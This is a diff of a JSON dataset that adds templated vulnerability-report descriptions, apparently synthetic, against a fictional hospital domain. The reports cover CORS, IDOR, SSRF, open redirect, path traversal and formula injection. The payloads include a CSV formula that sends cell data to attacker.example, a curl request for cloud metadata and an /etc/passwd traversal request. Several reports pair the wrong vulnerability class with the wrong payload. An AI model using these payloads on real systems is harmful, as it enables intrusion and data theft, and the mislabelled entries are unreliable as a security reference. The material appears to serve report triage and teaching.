+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.schwanensee-spital.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3962,7 +3993,8 @@
           "offset": "9d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4062,7 +4094,8 @@
           "offset": "20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4188,7 +4221,8 @@
           "offset": "5d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4341,7 +4375,8 @@
           "offset": "5d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4497,7 +4532,8 @@
           "offset": "8d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4598,7 +4634,8 @@
           "offset": "7d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.schwanensee-spital.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4726,7 +4763,8 @@
           "offset": "8d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.schwanensee-spital.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4862,7 +4900,8 @@
           "offset": "5d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schwanensee-spital.foo/import`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4966,7 +5005,8 @@
           "offset": "1d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schwanensee-spital.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5122,7 +5162,8 @@
           "offset": "4d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5258,7 +5299,8 @@
           "offset": "5d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schwanensee-spital.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5426,7 +5468,8 @@
           "offset": "5d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.schwanensee-spital.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5540,7 +5583,8 @@
           "offset": "6d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schwanensee-spital.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5671,7 +5715,8 @@
           "offset": "2d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.schwanensee-spital.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5806,7 +5851,8 @@
           "offset": "5d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5921,7 +5967,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6086,7 +6133,8 @@
           "offset": "6d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6233,7 +6281,8 @@
           "offset": "1d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6384,7 +6433,8 @@
           "offset": "5d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.schwanensee-spital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6540,7 +6590,8 @@
           "offset": "6d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6663,7 +6714,8 @@
           "offset": "8d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schwanensee-spital.foo/profile`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6772,7 +6824,8 @@
           "offset": "3d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6924,7 +6977,8 @@
           "offset": "8d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7040,7 +7094,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.schwanensee-spital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7164,7 +7219,8 @@
           "offset": "2d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7320,7 +7376,8 @@
           "offset": "6d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7467,7 +7524,8 @@
           "offset": "9d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7611,7 +7669,8 @@
           "offset": "3d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schwanensee-spital.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7769,7 +7828,8 @@
           "offset": "5d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.schwanensee-spital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7865,7 +7925,8 @@
           "offset": "20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8005,7 +8066,8 @@
           "offset": "6d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
